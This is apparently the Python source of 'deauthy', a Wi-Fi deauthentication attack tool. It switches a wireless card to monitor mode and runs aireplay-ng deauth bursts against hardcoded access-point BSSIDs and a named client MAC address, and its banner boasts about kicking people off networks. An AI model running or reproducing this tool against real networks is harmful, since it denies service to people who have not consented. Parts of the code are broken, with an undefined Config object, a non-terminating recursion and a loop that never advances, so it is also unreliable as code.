from deauthy.auto_installer import Dependencies
Dependencies.remove()
Dependencies.installed()
from socket import if_nameindex
from subprocess import DEVNULL, STDOUT, check_call, check_output, CalledProcessError
from sys import exit
from halo import Halo
from deauthy.deauthy_types import BSSID, ESSID, Interface
from deauthy.terminal import Terminal
from deauthy.checks import Checks

red         = Terminal.Red
cyan        = Terminal.Cyan
blue        = Terminal.Blue
white       = Terminal.White
bold        = Terminal.Bold
yellow      = Terminal.Yellow
light_green = Terminal.Light_green
light_white = Terminal.Light_white
end         = Terminal.End
light_blue  = Terminal.Light_blue
underline   = Terminal.Underline

current_wiface = f""

# Beautiful is better than ugly.
# Explicit is better than implicit.
# Simple is better than complex.
# Complex is better than complicated.
# Flat is better than nested.
# Sparse is better than dense.
# Readability counts.
# Special cases aren't special enough to break the rules.
# Although practicality beats purity.
# Errors should never pass silently.
# Unless explicitly silenced.
# In the face of ambiguity, refuse the temptation to guess.
# There should be one-- and preferably only one --obvious way to do it.
# Although that way may not be obvious at first unless you're Dutch.
# Now is better than never.
# Although never is often better than *right* now.
# If the implementation is hard to explain, it's a bad idea.
# If the implementation is easy to explain, it may be a good idea.
# Namespaces are one honking great idea -- let's do more of those!

{
    "28:C7:CE:4E:AF:B0":1,
    "28:c7:ce:4e:af:bf":1,
    "50:1C:BF:E2:DE:F0":11,
    "28:C7:CE:4F:06:C0":1,
    "28:C7:CE:4F:04:F0":6,
} 
STATION = "8C:F5:A3:38:CC:73" # aka client mac address, the device you wish to deauthenticate

def clear():
    check_call(["clear"])

class deauthy:
    """Main class"""
    def Chipset_Support_Check():
        Terminal.inform(self=Terminal, msg=f"Checking if any of your devices (Built-in & External) support MONITOR mode...")
        for chipset_name in ["AR92", "RT3070", "RT3572", "8187L", "RTL8812AU", "AR93"]:
            try:
                out = check_output(f"lspci | grep {chipset_name}", shell=True)
                if chipset_name in out.decode():
                    put = out.decode('utf8', 'strict')
                    return True
            except CalledProcessError:
                Terminal.tell_issue(self=Terminal, msg=f"{red}{bold}I'm so sorry!")
                Terminal.tell_issue(self=Terminal, msg=f"{red}{bold}It seems your chipset is NOT SUPPORTED :/")
                Terminal.tell_issue(self=Terminal, msg=f"{red}{bold}If you are very certain your chipset supports monitor mode and packet injection")
                Terminal.tell_issue(self=Terminal, msg=f"{red}{bold}Please contribute to the project here by making an issue")
                Terminal.tell_issue(self=Terminal, msg=f"{red}{bold}Go to: {white}https://github.com/Dr-Insanity/deauthy/issues/new")
                Terminal.inform(self=Terminal, msg=f"{red}{bold}Goodbye!\n{end}Exiting...")
                exit(1)

    def prompt_for_ifaces():
        cards = []
        interfaces = {} # type: dict[str, str]
        def gather_ifaces():
            pos = 1
            for ifaces in if_nameindex():
                print(f"{white}[{yellow}{pos}{white}] {white}{ifaces[1]}")
                cards.append(str(pos))
                interfaces[str(pos)] = ifaces[1]
                pos += 1
            return pos-1
        ifaces = gather_ifaces()
        try:
            method = Terminal.prompt(self=Terminal, question=f"{light_white}Which {bold}wireless{end}{light_white} interface should be put into monitor mode? Enter corresponding number {light_blue}({yellow}1{white}-{yellow}{ifaces}{light_blue})", allowed_replies=cards, ending_color=yellow)
            selected_card = interfaces[method]
            return selected_card
        except KeyboardInterrupt:
            print(" ")
            Terminal.inform(self=Terminal, msg=f"{light_green}{bold}Goodbye!\n{end}Exiting...")
            exit(0)
        except KeyError:
            print(" ")
            Terminal.inform(self=Terminal, msg=f"{red}{bold}Hey! {end}{red}That's not a valid interface! >:(\n{red}{bold}AGAIN!")
            deauthy.prompt_for_ifaces()
    class Appearance:

        def printBanner():
            clear()
            print(red + """

██████╗ ███████╗     █████╗ ██╗   ██╗████████╗██╗  ██╗██╗   ██╗
██╔══██╗██╔════╝    ██╔══██╗██║   ██║╚══██╔══╝██║  ██║╚██╗ ██╔╝
██║  ██║█████╗█████╗███████║██║   ██║   ██║   ███████║ ╚████╔╝ 
██║  ██║██╔══╝╚════╝██╔══██║██║   ██║   ██║   ██╔══██║  ╚██╔╝  
██████╔╝███████╗    ██║  ██║╚██████╔╝   ██║   ██║  ██║   ██║   
╚═════╝ ╚══════╝    ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝   ╚═╝                             
            """ + light_green + """
Time to kick off some assholes from yer net""")
            return True

    class BSSID_METHOD:
        def deauth(bSSID: BSSID):
            """"""
            channel = Config.BSSIDs[bSSID]
            deauthy.ChannelSys.hopper(channel)
            try:
                out = check_call(["aireplay-ng", "-0", "5", "-a", bSSID, "-c", Config.STATION, Config.iface_mon], stdout=DEVNULL, stderr=STDOUT)
            except KeyboardInterrupt:
                deauthy.InterfaceMode.switch(Interface(current_wiface), "managed")
                return
    class ESSID_METHOD:
        def deauth(eSSID: str):
            """"""
            channel = Config.ESSID[eSSID]
            deauthy.ChannelSys.hopper(channel)
            try:
                out = check_call(["aireplay-ng", "-0", "5", "-e", eSSID, "-c", Config.STATION, Config.iface_mon], stdout=DEVNULL, stderr=STDOUT)
            except KeyboardInterrupt:
                deauthy.InterfaceMode.switch(Interface(current_wiface), "managed")
                return

    class ChannelSys:
        def hopper(channel_number: int):
            """Hop to a different channel"""
            out = check_call(["airmon-ng", "start", f"{current_wiface}mon", f"{channel_number}"], stdout=DEVNULL, stderr=STDOUT)

    class InterfaceMode:
        def switch(card: Interface, mode: str):
            """
            Accepts either "monitor" or "managed"
            """
            def managed():
                out = check_call(["airmon-ng", "stop", f"{card.name}mon"], stdout=DEVNULL, stderr=STDOUT)
            def monitor():
                spinner = Halo(f"Putting {card.name} into monitor mode...")
                spinner.start()
                out = check_call(["airmon-ng", "start", f"{card.name}"], stdout=DEVNULL, stderr=STDOUT)
                if out != 1:
                    spinner.succeed(f"{card.name} is now in monitor mode")
                else:
                    spinner.fail(f"Could not put {card.name} in monitor mode\nQUITING!{end}")
                
                
            modes = {
                "managed":managed,
                "monitor":monitor,
            }
            try:
                modes[mode]()
            except KeyError:
                raise RuntimeError("That's not a valid interface mode.")

def main():
    def do_bssid_method():
        for bssid, channel in Config.BSSIDs.items():
            deauthy.BSSID_METHOD.deauth(bssid)
        try:
            do_bssid_method()
        except KeyboardInterrupt:
            deauthy.InterfaceMode.switch(card=Interface(cardname), mode="managed")
            return
    
    Terminal.inform(self=Terminal, msg=f"{bold}{light_green}Hey! {end}{light_white}Tip of the day: Parrot Security or Kali Linux is recommended! Although, real control freaks use ArchLinux")
    deauthy.Chipset_Support_Check()
    Terminal.inform(self=Terminal, msg=f"{white}Running as {light_green}{bold}Root{end}")
    Terminal.inform(self=Terminal, msg=f"{bold}{white}Chipset is {light_green}supported!{end}")
    Terminal.inform(self=Terminal, msg=f"{cyan}Choose a {bold}{cyan}wireless{end}{cyan} interface {white}({light_white}{bold}step {light_green}1{end}{light_white}/{white}3)")
    cardname = deauthy.prompt_for_ifaces()
    deauthy.InterfaceMode.switch(card=Interface(cardname), mode="monitor")
    method = Terminal.prompt(self=Terminal, question="Use ESSID or BSSIDs (BSSID / ESSID)", allowed_replies=["bssid", "essid"])
    if method == "BSSID":
        try:
            amt_of_bssids   = Terminal.prompt(self=Terminal, question=f"How many BSSIDs?", allowed_replies=["any"])
            numb_of_bssids  = int(amt_of_bssids)
            bssids_added = 0
            while bssids_added < numb_of_bssids:
                Terminal.prompt(self=Terminal, question=f"{white}Enter BSSID {light_green}{bold}{bssids_added+1}{end}{white}/{amt_of_bssids}", allowed_replies=["any"])
            do_bssid_method()
        except KeyboardInterrupt:
            deauthy.InterfaceMode.switch(Interface(current_wiface), "managed")
            return
    elif method == "ESSID":
        deauthy.ESSID_METHOD.deauth(Config.ESSID)
        return

try:
    if not Checks.has_root():
        Terminal.tell_issue(self=Terminal, msg=f"{bold}{red}Run it as root...{end}")
        exit(1)
    deauthy.Appearance.printBanner()
    main()
except KeyboardInterrupt:
    quit(0)